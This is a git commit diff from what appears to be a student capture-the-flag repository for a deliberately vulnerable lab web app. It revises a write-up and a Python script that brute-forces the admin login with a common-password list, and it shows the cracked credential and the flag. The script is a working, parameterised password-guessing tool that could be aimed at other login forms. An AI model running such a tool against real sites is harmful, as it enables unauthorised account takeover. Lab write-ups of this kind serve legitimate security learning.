9b3e4b33394748936edabcaa9b4095ba20ed9c52
farkasf <120285330+farkasf@users.noreply.github.com>
2024-08-15 03:08:00 +0200

    Bruteforcing algorithm edited

--- 9_Bruteforce_password/resources/9_writeup.md
+++ 9_Bruteforce_password/resources/9_writeup.md
@@ -13,47 +13,19 @@ http://borntosec.42/index.php?page=signin&username=&password=&Login=Login#
 ```
 This means we can attempt to brute force our way into the 'admin' account using a custom Python script and a file containing the 1000 most commonly used passwords:
 ``` shell
-└─$ python3 bruteforce.py
-Bruteforcing 'admin' on http://borntosec.42
-Testing '123456': status 200
-    --> diff KO
-Testing 'password': status 200
-    --> diff KO
-Testing '12345678': status 200
-    --> diff KO
-Testing 'qwerty': status 200
-    --> diff KO
-Testing '123456789': status 200
-    --> diff KO
-Testing '12345': status 200
-    --> diff KO
-Testing '1234': status 200
-    --> diff KO
-Testing '111111': status 200
-    --> diff KO
-Testing '1234567': status 200
-    --> diff KO
-Testing 'dragon': status 200
-    --> diff KO
-Testing '123123': status 200
-    --> diff KO
-Testing 'baseball': status 200
-    --> diff KO
-Testing 'abc123': status 200
-    --> diff KO
-Testing 'football': status 200
-    --> diff KO
-Testing 'monkey': status 200
-    --> diff KO
-Testing 'letmein': status 200
-    --> diff KO
-Testing '696969': status 200
-    --> diff KO
-Testing 'shadow': status 200
-   --> diff OK
-'admin' cracked with password 'shadow'
+└─$ python3 bruteforce.py admin http://192.168.56.106/ 1000-most-common-passwords.txt 
+Bruteforcing user admin on http://192.168.56.106/
+
+     Cracking password [🔒    🔑   ]
 ```
-After logging in with the acquired credentials, the flag is displayed:
+After some time, the password is revealed:
+``` shell
+Bruteforcing user admin on http://192.168.56.106/
+
+Credentials cracked! admin:shadow
+```
+
+When we log in with the acquired credentials, the flag is displayed:
 ```
 The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
 ```
--- 9_Bruteforce_password/resources/bruteforce.py
+++ 9_Bruteforce_password/resources/bruteforce.py
@@ -1,27 +1,74 @@
 import requests
 import sys
+import time
+import threading
 
 RED = "\033[31m"
 DEF = "\033[0m"
 
-target = "http://borntosec.42"
-database = "1000-most-common-passwords.txt"
+frames = [
+    "[🔒       🔑]",
+    "[🔒      🔑 ]",
+    "[🔒     🔑  ]",
+    "[🔒    🔑   ]",
+    "[🔒   🔑    ]",
+    "[🔒  🔑     ]",
+    "[🔒 🔑      ]",
+    "[🔒🔑       ]",
+    "[🔓         ]",
+    "[🔓         ]",
+    "[🔓         ]",
+    "[🔓         ]",
+    "[🔒🔑       ]",
+    "[🔒 🔑      ]",
+    "[🔒  🔑     ]",
+    "[🔒   🔑    ]",
+    "[🔒    🔑   ]",
+    "[🔒     🔑  ]",
+    "[🔒      🔑 ]",
+    "[🔒       🔑]",
+]
 
-print(f"{RED}Bruteforcing 'admin' on {target}{DEF}")
+stop_loading = threading.Event()
 
-file = open(database, 'r')
+def loading():
+    while not stop_loading.is_set():
+        for frame in frames:
+            if stop_loading.is_set():
+                break
+            sys.stdout.write(f"\r     Cracking password {frame}")
+            sys.stdout.flush()
+            time.sleep(0.2)
 
-for password in file:
-	try:
-		password = password.strip()
-		test_url = f"{target}/?page=signin&username=admin&password={password}&Login=Login"
-		response = requests.get(test_url)
-		print(f"Testing '{password}': status {response.status_code}")
-		if "WrongAnswer" not in response.text:
-			print(f"   --> diff OK\n{RED}'admin' cracked with password '{password}'{DEF}")
-			break
-		else:
-			print("    --> diff KO")
-	except KeyboardInterrupt:
-		print(f"\n{RED}Exitting...{DEF}")
-		sys.exit(0)
+def bruteforce(user, target, database):
+    print(f"\nBruteforcing user {RED}{user}{DEF} on {RED}{target}{DEF}\n")
+    loading_thread = threading.Thread(target=loading)
+    loading_thread.start()
+
+    try:
+        with open(database, 'r') as file:
+            for password in file:
+                password = password.strip()
+                test_url = f"{target}/?page=signin&username={user}&password={password}&Login=Login"
+                response = requests.get(test_url)
+                if "WrongAnswer" not in response.text:
+                    stop_loading.set()
+                    loading_thread.join()
+                    sys.stdout.write("\r" + 40*" " + "\r" + f"{RED}Credentials cracked!{DEF} {user}:{password}\n\n")
+                    sys.stdout.flush()
+                    break
+    except KeyboardInterrupt:
+        print(f"\n\n{RED}Exiting...{DEF}\n")
+        sys.exit(0)
+    except Exception as e:
+        print(f"\n\n{RED}Error:{DEF} {e}\n")
+        sys.exit(1)
+    finally:
+        stop_loading.set()
+        loading_thread.join()
+
+if __name__ == "__main__":
+    if len(sys.argv) != 4:
+        print(f"{RED}usage:{DEF} python3 bruteforce.py <username> <target IP> <dictionary>")
+        sys.exit(1)
+    bruteforce(sys.argv[1], sys.argv[2], sys.argv[3])
